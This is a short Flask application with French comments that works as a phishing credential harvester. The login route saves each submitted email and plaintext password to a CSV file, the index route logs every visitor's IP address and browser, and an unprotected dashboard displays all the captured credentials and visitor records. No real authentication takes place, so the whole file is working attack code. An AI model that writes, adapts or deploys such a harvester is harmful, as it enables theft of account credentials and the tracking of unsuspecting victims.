from flask import Flask, request, render_template, redirect, url_for
import csv
import os
from datetime import datetime

app = Flask(__name__)

LOG_DIR = 'logs'
CREDS_FILE = os.path.join(LOG_DIR, 'creds.csv')
ACCESS_LOG_FILE = os.path.join(LOG_DIR, 'access_log.csv')

# Assurez-vous que le dossier et fichiers existent
os.makedirs(LOG_DIR, exist_ok=True)
if not os.path.exists(CREDS_FILE):
    with open(CREDS_FILE, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['Email', 'Password', 'Timestamp'])

if not os.path.exists(ACCESS_LOG_FILE):
    with open(ACCESS_LOG_FILE, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['IP', 'User-Agent', 'Timestamp'])

@app.route('/', methods=['GET'])
def index():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(ACCESS_LOG_FILE, 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([ip, ua, now])
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(CREDS_FILE, 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([email, password, now])
    # Redirection vers la page de succès après la connexion
    return redirect(url_for('login_success'))
    #return render_template('login.html')

@app.route('/success')
def login_success():
    return render_template('success.html')

@app.route('/dashboard')
def dashboard():
    with open(CREDS_FILE, 'r') as f:
        reader = csv.reader(f)
        next(reader)  # skip header
        creds = list(reader)

    with open(ACCESS_LOG_FILE, 'r') as f:
        reader = csv.reader(f)
        next(reader)  # skip header
        visitors = list(reader)

    return render_template('dashboard.html', creds=creds, visitors=visitors)

if __name__ == '__main__':
    app.run(debug=True)
